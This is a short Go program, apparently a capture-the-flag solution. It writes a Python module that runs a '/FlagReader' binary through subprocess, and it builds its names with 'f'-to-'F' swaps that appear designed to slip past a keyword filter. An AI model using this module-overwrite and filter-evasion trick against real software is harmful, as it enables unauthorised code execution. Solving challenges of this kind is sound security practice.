package main

import (
	"fmt"
	"io/ioutil"
)

func main() {
	// The file where to write data
	filePath := "encrypt.py"

	// The data you want to write to the file
	data := `
import subprocess
def Encryptflag():
	flag = "/flagReader"
	flag = flag.replace("f", "F")
	result = subprocess.check_output([flag], universal_newlines=True)
	print(result)
globals()["Encryptflag".replace("f", "F")] = Encryptflag
`

	// Write data to the file
	err := ioutil.WriteFile(filePath, []byte(data), 0644)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("Data written to the file successfully.")
}
